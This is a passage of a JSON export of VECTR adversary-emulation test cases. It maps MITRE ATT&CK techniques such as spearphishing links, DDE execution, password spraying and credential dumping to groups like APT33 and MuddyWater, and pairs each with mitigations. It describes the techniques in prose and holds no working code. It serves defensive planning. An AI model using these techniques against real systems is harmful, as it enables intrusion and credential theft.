sessions.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0","relationship--88c50625-6d02-42fb-aa82-4315a532b754","relationship--98bdcea2-1c8d-4a65-b75d-075a00d6e87c","course-of-action--684feec3-f9ba-4049-9d8f-52d52f3e0e40","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--4d8fd7fc-eb0b-4031-8df0-ef3d237edb7c","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy"],"mitreId":"T1016"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--4c750490-533f-4a4e-9692-f972bf3eba64","vectrId":"4c750490-533f-4a4e-9692-f972bf3eba64","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"4c750490-533f-4a4e-9692-f972bf3eba64","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing Link","variant":"APT33 - Spearphishing Link","objective":"Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)","command":"[APT33](https://attack.mitre.org/groups/G0064) has sent spearphishing emails containing links to .hta files.Users can be trained to identify social engineering techniques and spearphishing emails with malicious links.\n---\nDetermine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba","relationship--639e7b8d-57d7-4c1d-8f42-1496606ea666","relationship--1c04a87c-6a12-4aaa-8ead-30cd22d7850d","course-of-action--ad7f983d-d5a8-4fce-a38c-b68eda61bf4e","relationship--93669ebc-ea8d-4f76-94c8-4f8d1679b123","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--541884aa-9ee9-4241-b556-c7885c12102b","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019. https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks","O'Leary, J., et al. (2017, September 20). Insights into Iranian Cyber Espionage: APT33 Targets Aerospace and Energy Sectors and has Ties to Destructive Malware. Retrieved February 15, 2018. https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage"],"mitreId":"T1192"},"blueTeam":{"successfulDetectionBehaviors":["Because this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails with malicious links. Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk. Other mitigations can take place as [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--4e2a015b-5dd6-4687-ada5-669e1b4d435d","vectrId":"4e2a015b-5dd6-4687-ada5-669e1b4d435d","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"4e2a015b-5dd6-4687-ada5-669e1b4d435d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Dynamic Data Exchange","variant":"MuddyWater - Dynamic Data Exchange","objective":"Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)\n\nAdversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that can execute PowerShell scripts via DDE.Consider disabling embedded files in Office programs, such as OneNote, that do not work with Protected View.\n---\nRegistry keys specific to Microsoft Office feature control security can be set to disable automatic DDE/OLE execution. Microsoft also created, and enabled by default, Registry keys to completely disable DDE execution in Word and Excel.\n---\nEnsure Protected View is enabled.\n---\nOn Windows 10, enable Attack Surface Reduction (ASR) rules to prevent DDE attacks and spawning of child processes from Office programs.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0","relationship--5ac271fa-d3a7-40a6-8862-3eb73331ae99","relationship--e93b22f5-2df4-49d7-bf4b-985919028e4e","course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067","relationship--180a8796-fe25-4ae3-93e2-f7e33960e263","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--8467ea5f-cb0d-4eb6-b524-8bfd01e58721","course-of-action--80c91478-ac87-434f-bee7-11f37aec4d74","relationship--954d7473-a942-4af3-8706-d47dc7cdffb6","course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463","relationship--3aaa150d-c88e-4483-b658-c417ae9bc557","course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Brower, N. & D'Souza-Wiltshire, I. (2017, November 9). Enable Attack surface reduction. Retrieved February 3, 2018. https://docs.microsoft.com/windows/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction","Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017. https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/","Dormann, W. (2017, October 20). Disable DDEAUTO for Outlook, Word, OneNote, and Excel versions 2010, 2013, 2016. Retrieved February 3, 2018. https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b","El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017. https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017. https://www.contextis.com/blog/comma-separated-vulnerabilities","Microsoft. (2017, December 12). ADV170021 - Microsoft Office Defense in Depth Update. Retrieved February 3, 2018. https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021","Microsoft. (2017, November 8). Microsoft Security Advisory 4053440 - Securely opening Microsoft Office documents that contain Dynamic Data Exchange (DDE) fields. Retrieved November 21, 2017. https://technet.microsoft.com/library/security/4053440","Microsoft. (n.d.). What is Protected View?. Retrieved November 22, 2017. https://support.office.com/en-us/article/What-is-Protected-View-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653","NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017. https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/","Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and Excel for Code Execution. Retrieved February 3, 2018. https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee","Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017. https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/"],"mitreId":"T1173"},"blueTeam":{"successfulDetectionBehaviors":["Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Registry keys specific to Microsoft Office feature control security can be set to disable automatic DDE/OLE execution. (Citation: Microsoft DDE Advisory Nov 2017) (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: GitHub Disable DDEAUTO Oct 2017) Microsoft also created, and enabled by default, Registry keys to completely disable DDE execution in Word and Excel. (Citation: Microsoft ADV170021 Dec 2017)\n\nEnsure Protected View is enabled (Citation: Microsoft Protected View) and consider disabling embedded files in Office programs, such as OneNote, not enrolled in Protected View. (Citation: Enigma Reviving DDE Jan 2018) (Citation: GitHub Disable DDEAUTO Oct 2017)\n\nOn Windows 10, enable Attack Surface Reduction (ASR) rules to prevent DDE attacks and spawning of child processes from Office programs. (Citation: Microsoft ASR Nov 2017) (Citation: Enigma Reviving DDE Jan 2018)","Restrict execution of code to a virtual environment on or in transit to an endpoint system.","Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--4f007b9e-ccfd-472b-8a02-47094203d445","vectrId":"4f007b9e-ccfd-472b-8a02-47094203d445","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"4f007b9e-ccfd-472b-8a02-47094203d445","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Brute Force","variant":"APT33 - Brute Force - PoshC2","objective":"Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.\n\n[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)\n\nAdversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nA related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1086). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)","command":"[APT33](https://attack.mitre.org/groups/G0064) has used password spraying to gain access to target systems.Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.\n---\nSet account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out.\n---\nRefer to NIST guidelines when creating password policies.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) has modules for brute forcing local administrator and AD user accounts.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["740b39a7-cf4c-4c2d-acf1-585754a5b04f"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd","relationship--8b5691c7-1815-4d76-a7dd-dfd827043bb9","relationship--cb87a0ce-0976-49e5-8e9c-2c908a24b30f","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--c1a6c86e-5d5d-4cf1-845e-1660d9c19baf","course-of-action--f9f9e6ef-bc0a-41ad-ba11-0924e5e84c4c","relationship--cade3e14-aab4-4297-b77d-019d3ee0ccef","course-of-action--4a99fecc-680b-448e-8fe7-8144c60d272c","relationship--d1f67e5c-72c6-4e26-91d4-bc8593e61774","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","tool--4b57c098-f043-4da2-83ef-7588a6d426bc","relationship--8303719d-b2ed-4860-9af4-57b636c4f865","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017. https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf","Grassi, P., et al. (2017, December 1). SP 800-63-3, Digital Identity Guidelines. Retrieved January 16, 2019. https://pages.nist.gov/800-63-3/sp800-63b.html","Metcalf, S. (2018, May 6). Trimarc Research: Detecting Password Spraying with Security Event Auditing. Retrieved January 16, 2019. https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing","Nettitude. (2018, July 23). Python Server for PoshC2. Retrieved April 23, 2019. https://github.com/nettitude/PoshC2_Python","Thyer, J. (2015, October 30). Password Spraying & Other Fun with RPCCLIENT. Retrieved April 25, 2017. http://www.blackhillsinfosec.com/?p=4645","US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019. https://www.us-cert.gov/ncas/alerts/TA18-086A","Wikipedia. (n.d.). Password cracking. Retrieved December 23, 2015. https://en.wikipedia.org/wiki/Password_cracking"],"mitreId":"T1110"},"blueTeam":{"successfulDetectionBehaviors":["Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Configure features related to account use like login attempt lockouts, specific login times, etc.","Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. \nToo strict a policy can create a denial of service condition and render environments un-usable, with all accounts being locked-out permanently. Use multifactor authentication. Follow best practices for mitigating access to [Valid Accounts](https://attack.mitre.org/techniques/T1078)\n\nRefer to NIST guidelines when creating passwords.(Citation: NIST 800-63-3)\n\nWhere possible, also enable multi factor authentication on external facing services.","Set and enforce secure password policies for accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--4f8cb780-ad75-4f7f-bd6e-7521dc5e8a9f","vectrId":"4f8cb780-ad75-4f7f-bd6e-7521dc5e8a9f","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"4f8cb780-ad75-4f7f-bd6e-7521dc5e8a9f","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Network Configuration Discovery","variant":"MuddyWater - System Network Configuration Discovery","objective":"Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware to collect the victim’s IP address and domain name.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0","relationship--4ab6ada3-0129-4f34-ba29-b793c6d98fff","relationship--98bdcea2-1c8d-4a65-b75d-075a00d6e87c","course-of-action--684feec3-f9ba-4049-9d8f-52d52f3e0e40","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/"],"mitreId":"T1016"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--505e1f38-f0f4-47ed-9623-f62924efcdc3","vectrId":"505e1f38-f0f4-47ed-9623-f62924efcdc3","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"505e1f38-f0f4-47ed-9623-f62924efcdc3","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"User Execution","variant":"Magic Hound - User Execution","objective":"An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. \n\nAs an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) \n\nWhile User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) has attempted to get users to execute malware via social media and spearphishing emails.Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.\n---\nApplication whitelisting may be able to prevent the running of executables masquerading as other files.\n---\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.\n---\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5","relationship--a381abec-332f-4b93-9585-875561eb52c1","relationship--1d1525e6-74f2-447d-ba11-9e9c9c552403","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--225ab1b4-f800-4a92-9949-a0f05fce6213","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--8e567361-e2de-4dc6-b953-ec82dc143f58","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--66551074-a1e3-439c-a996-c1f7ca8136e2","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--29be2366-5ffb-4499-9984-525f76525326","course-of-action--548bf7ad-e19c-4d74-84bf-84ac4e57f505","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Counter Threat Unit Research Team. (2017, July 27). The Curious Case of Mia Ash: Fake Persona Lures Middle Eastern Targets. Retrieved February 26, 2018. https://www.secureworks.com/research/the-curious-case-of-mia-ash","Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018. https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html","Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019. https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times","PwC and BAE Systems. (2017, April). Operation Cloud Hopper: Technical Annex. Retrieved April 13, 2017. https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"],"mitreId":"T1204"},"blueTeam":{"successfulDetectionBehaviors":["Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Use intrusion detection signatures to block traffic at network boundaries.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events. Application whitelisting may be able to prevent the running of executables masquerading as other files.\n\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .lnk, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and RAR that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct files in a way to avoid these systems."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--562e74cf-7706-4bdb-80a2-04bbea023ddd","vectrId":"562e74cf-7706-4bdb-80a2-04bbea023ddd","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"562e74cf-7706-4bdb-80a2-04bbea023ddd","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credential Dumping","variant":"OilRig - Credential Dumping - LaZagne - Mimikatz","objective":"Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\n### Windows\n\n#### SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the ‘net 